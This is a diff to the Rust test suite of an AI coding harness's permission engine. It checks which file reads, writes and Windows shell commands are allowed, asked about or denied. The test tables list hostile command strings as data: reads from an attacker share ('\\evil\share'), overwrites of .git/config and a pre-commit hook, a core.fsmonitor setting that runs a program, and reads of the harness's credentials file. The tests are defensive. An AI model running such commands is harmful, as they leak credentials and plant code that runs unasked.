@@ -12,7 +12,7 @@ use cortex_policy::{
 use cortex_protocol::ids::LeaseId;
 use cortex_protocol::lease::{Budget, Effect, HardLimits, Level, RuleAction};
 
-use crate::Said::{Allow, Ask, Deny};
+use crate::Said::{Allow, Ask, Deny, ReadOnly};
 use crate::{
     Said, at, clock, engine, engine_with, path, project, question, read, reason, said, user,
     with_rules, write,
@@ -39,7 +39,15 @@ fn reads_and_edits_inside_the_workspace_run_and_outside_it_ask() {
         ("/work/app/.git/config", Allow, Ask),
         ("/work/app/.cortex/config.toml", Allow, Ask),
         ("/work/app/.bashrc", Allow, Ask),
-        ("/work/app/.git/HEAD", Allow, Allow),
+        // All of a repository's own data, in the workspace's repository
+        // and in one nested in it.
+        ("/work/app/.git/HEAD", Allow, Ask),
+        ("/work/app/.git/objects/ab/cdef", Allow, Ask),
+        ("/work/app/sub/.git/config", Allow, Ask),
+        // What a CI service runs, and registry settings.
+        ("/work/app/.github/workflows/ci.yml", Allow, Ask),
+        ("/work/app/.cargo/config.toml", Allow, Ask),
+        ("/work/app/.gitignore", Allow, Allow),
         // Files that look like secrets: asked about either way.
         ("/work/app/.env", Ask, Ask),
         ("/work/app/config/.env.production", Ask, Ask),
@@ -308,9 +316,13 @@ fn windows(text: &str) -> AbsPath {
 /// An engine whose paths are Windows paths, read as text, so that the
 /// rules about case are tested on every OS.
 fn windows_engine(rules: Vec<cortex_policy::SourcedRule>) -> Engine {
+    Engine::start(windows_parts(rules)).unwrap()
+}
+
+fn windows_parts(rules: Vec<cortex_policy::SourcedRule>) -> Parts {
     let workspace = windows(r"C:\Work\App");
     let home = windows(r"C:\People\Dev");
-    Engine::start(Parts {
+    Parts {
         lease_id: LeaseId::new("l_1"),
         level: Level::Supervised,
         rules,
@@ -329,8 +341,7 @@ fn windows_engine(rules: Vec<cortex_policy::SourcedRule>) -> Engine {
         locate: Arc::new(Lexical { home: Some(home) }),
         store: None,
         clock: clock(),
-    })
-    .unwrap()
+    }
 }
 
 fn windows_read(engine: &Engine, file: &str) -> Said {
@@ -341,6 +352,97 @@ fn windows_read(engine: &Engine, file: &str) -> Said {
             path: windows(file),
         }],
     }))
+}
+
+fn windows_shell(engine: &Engine, command: &str) -> Said {
+    said(&engine.decide(&Request {
+        tool: "shell",
+        default: RuleAction::Ask,
+        accesses: &[
+            Access::Exec {
+                command: command.to_owned(),
+                cwd: windows(r"C:\Work\App"),
+            },
+            Access::Write {
+                path: windows(r"C:\Work\App"),
+            },
+        ],
+    }))
+}
+
+/// What a command names is read as Windows would read it. A path that
+/// starts at the root of the drive, at another drive or at a share is not
+/// under the directory the command runs in, whatever it looks like.
+#[test]
+fn on_windows_a_command_is_judged_by_the_path_windows_would_open() {
+    let engine = windows_engine(Vec::new());
+    let table = [
+        (r"Get-Content src\main.rs", ReadOnly),
+        (r"Get-Content C:\Work\App\src\main.rs", ReadOnly),
+        // From the root of the current drive: never under the directory
+        // the command runs in. Read as text, such a path is not followed
+        // at all, so even one that spells the workspace is asked about.
+        (r"Get-Content \Work\App\src\main.rs", Ask),
+        (r"Get-Content \Windows\win.ini", Ask),
+        (r"Get-Content /Windows/win.ini", Ask),
+        (r"Get-ChildItem \", Ask),
+        // Another drive, and the directory another drive is in.
+        (r"Get-Content D:\Work\App\src\main.rs", Ask),
+        ("Get-Content D:main.rs", Ask),
+        ("Get-Content C:main.rs", Ask),
+        // A share: Windows sends the user's credentials to whoever
+        // answers.
+        (r"Get-Content \\evil\share\a.txt", Ask),
+        ("Get-Content //evil/share/a.txt", Ask),
+        (r"git diff --no-index \\evil\share\a b", Ask),
+        (r"git grep --no-index x \\evil\share", Ask),
+        ("git log -- //evil/share/x", Ask),
+        (r"git show HEAD:\\evil\share\a", Ask),
+        (r"git diff \Windows\win.ini", Ask),
+        // A revision is not a path.
+        ("git diff HEAD", ReadOnly),
+        ("git log -3 main", ReadOnly),
+        // A protected path, in any case and with either separator.
+        (r"Copy-Item evil .git\config", Ask),
+        (r"Copy-Item evil .GIT\Config", Ask),
+        ("Copy-Item evil .git/hooks/pre-commit", Ask),
+        (r"Copy-Item evil sub\.Git\config", Ask),
+        (r"Copy-Item evil .GitHub\Workflows\ci.yml", Ask),
+        (r"Copy-Item evil \Work\App\.git\config", Ask),
+        (r"Copy-Item evil .ENV", Ask),
+        ("GIT.EXE config core.fsmonitor run.cmd", Ask),
+        // The harness's own files: refused.
+        (
+            r"Get-Content C:\People\Dev\AppData\Roaming\cortex-harness\credentials.toml",
+            Deny,
+        ),
+        (
+            r"Get-Content ~\appdata\roaming\CORTEX-HARNESS\credentials.toml",
+            Deny,
+        ),
+    ];
+    for (command, expected) in table {
+        assert_eq!(windows_shell(&engine, command), expected, "{command:?}");
+    }
+    // Where commands run unasked, a protected path named in any case is
+    // still asked about.
+    let autonomous = {
+        let mut parts = windows_parts(Vec::new());
+        parts.level = Level::Autonomous;
+        Engine::start(parts).unwrap()
+    };
+    for command in [
+        r"Copy-Item evil .GIT\Config",
+        r"Copy-Item evil sub\.git\CONFIG",
+        r"Copy-Item evil .Cargo\Config.toml",
+        "git.exe config core.fsmonitor run.cmd",
+    ] {
+        assert_eq!(windows_shell(&autonomous, command), Ask, "{command:?}");
+    }
+    assert_eq!(
+        windows_shell(&autonomous, r"Copy-Item a.txt src\b.txt"),
+        Allow
+    );
 }
 
 fn windows_write(engine: &Engine, file: &str) -> Said {
